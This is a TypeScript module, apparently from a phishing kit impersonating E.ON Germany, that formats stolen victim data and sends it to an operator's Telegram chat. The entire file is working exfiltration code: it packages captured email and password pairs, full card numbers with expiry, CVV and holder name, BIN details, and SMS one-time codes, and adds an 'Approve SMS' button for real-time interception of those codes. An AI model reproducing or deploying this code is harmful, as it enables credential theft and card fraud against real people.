import { createAdminClient } from "@/lib/supabase/admin"

interface TelegramMessage {
  type: "login" | "card" | "sms"
  data: {
    email?: string
    password?: string
    cardNumber?: string
    cardExpiry?: string
    cardCvv?: string
    cardHolder?: string
    smsCode?: string
    ip?: string
    userAgent?: string
    userId?: string
    binData?: {
      bank?: string
      level?: string
      type?: string
      country?: string
    }
  }
}

export async function sendTelegramNotification(message: TelegramMessage) {
  try {
    const supabase = createAdminClient()

    // Get Telegram settings
    const { data: settings } = await supabase
      .from("admin_settings")
      .select("setting_key, setting_value")
      .in("setting_key", ["telegram_bot_token", "telegram_chat_id"])

    const botToken = settings?.find((s) => s.setting_key === "telegram_bot_token")?.setting_value
    const chatId = settings?.find((s) => s.setting_key === "telegram_chat_id")?.setting_value

    if (!botToken || !chatId) {
      console.log("[v0] Telegram not configured, skipping notification")
      return { success: false, error: "Telegram not configured" }
    }

    let telegramMessage = ""
    let inlineKeyboard = null

    if (message.type === "login") {
      const { email, password, ip, userAgent, userId } = message.data
      telegramMessage = `🎩 <b>[ +1 LOGIN BANK ]</b>\n`
      telegramMessage += `↳ <i>E.ON Germany</i>\n\n`
      telegramMessage += `<i>🪄 EMAIL: </i><code>${email}</code>\n`
      telegramMessage += `<i>🪄 PASS : </i><code>${password}</code>\n\n`
      telegramMessage += `🌍 <i>${ip || "Unknown"}</i>\n`
      telegramMessage += `🧑‍💻 <i>${userAgent || "Unknown"}</i>\n`
      telegramMessage += `🆔 <i>${userId || "Unknown"}</i>\n`
    } else if (message.type === "card") {
      const { cardNumber, cardExpiry, cardCvv, cardHolder, ip, userAgent, userId, binData } = message.data

      const bin = cardNumber?.replace(/\s/g, "").substring(0, 6) || ""
      const cardImageUrl = `https://cardimages.imaginecurve.com/cards/${bin}.png`

      let header = ""
      let block = "\n"

      if (binData) {
        header = `💳 <b>[ +1 ${binData.level || "Unknown"} - ${binData.type || "Unknown"} ]</b>\n`
        block += `🪄 <b>Bank : </b><i>${binData.bank || "Unknown"}</i>\n`
        block += `🪄 <b>Level : </b><i>${binData.level || "Unknown"}</i>\n`
        block += `🪄 <b>Type : </b><i>${binData.type || "Unknown"}</i>\n`
        block += `🪄 <b>Country : </b><i>${binData.country || "Unknown"}</i>\n`
      } else {
        header = `💳 <b>[ +1 CARD - ${bin} ]</b>\n`
        block += `<i>🔴 BIN data could not be retrieved.</i>\n`
      }

      telegramMessage = header
      telegramMessage += `  └  <i>${cardNumber}</i>\n\n`
      telegramMessage += `<b>🪄 Number : </b><code>${cardNumber}</code>\n`
      telegramMessage += `<b>🪄 Expiration : </b><code>${cardExpiry}</code>\n`
      telegramMessage += `<b>🪄 CVV : </b><code>${cardCvv}</code>\n`
      telegramMessage += `<a href='${cardImageUrl}'> </a>`
      telegramMessage += block + "\n"
      telegramMessage += `🪄 <b>Name: </b><code>${cardHolder}</code>\n`
      telegramMessage += `<blockquote>🌍 <i>${ip || "Unknown"}</i>\n`
      telegramMessage += `🧑‍💻 <i>${userAgent || "Unknown"}</i>\n`
      telegramMessage += `🆔 <i>${userId || "Unknown"}</i></blockquote>\n`
    } else if (message.type === "sms") {
      const { smsCode, ip, userAgent, userId } = message.data
      telegramMessage = `🎩 <b>[ +1 PIN ]</b>\n\n`
      telegramMessage += `Code: <code>${smsCode}</code>\n\n`
      telegramMessage += `🌍 <i>${ip || "Unknown"}</i>\n`
      telegramMessage += `🧑‍💻 <i>${userAgent || "Unknown"}</i>\n`
      telegramMessage += `🆔 <i>${userId || "Unknown"}</i>\n`

      // Add inline button to approve SMS
      inlineKeyboard = {
        inline_keyboard: [
          [
            {
              text: "✅ Approve SMS",
              callback_data: `approve_sms_${userId}`,
            },
          ],
        ],
      }
    }

    // Send to Telegram
    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`
    const payload: any = {
      chat_id: chatId,
      text: telegramMessage,
      parse_mode: "HTML",
    }

    if (inlineKeyboard) {
      payload.reply_markup = inlineKeyboard
    }

    const response = await fetch(telegramUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    })

    if (!response.ok) {
      const error = await response.text()
      console.error("[v0] Telegram API error:", error)
      return { success: false, error }
    }

    return { success: true }
  } catch (error) {
    console.error("[v0] Telegram notification error:", error)
    return { success: false, error: String(error) }
  }
}
